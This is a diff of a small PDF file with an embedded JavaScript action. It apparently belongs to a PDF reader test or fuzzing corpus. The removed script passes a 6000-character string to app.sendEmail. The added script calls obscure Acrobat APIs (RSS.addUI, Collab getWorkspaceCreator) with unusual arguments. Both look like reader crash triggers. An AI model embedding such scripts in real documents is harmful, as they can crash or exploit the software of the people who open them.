@@ -40,7 +40,7 @@ endobj
 5 0 obj
 << /Length 56 >>
 stream
-BT /F1 12 Tf 100 700 Td 15 TL (YOU WON!!!11!!!!!!) Tj ET
+BT /F1 12 Tf 100 700 Td 15 TL (JavaScript example) Tj ET
 endstream
 endobj
 
@@ -59,10 +59,8 @@ endobj
  /Type /Action
  /S /JavaScript
  /JS (
-
-app.sendEmail(Array(6000).join("["))
-
- )
+RSS.addUI("urn://ns.adobe.com/Acrobat/Tracker/UI/FormsTracker", {})
+Collab.drivers[0].getWorkspaceCreator("", this))
 >>
 endobj
 
@@ -82,5 +80,5 @@ trailer
  /Root 1 0 R
 >>
 startxref
-1228
+696
 %%EOF
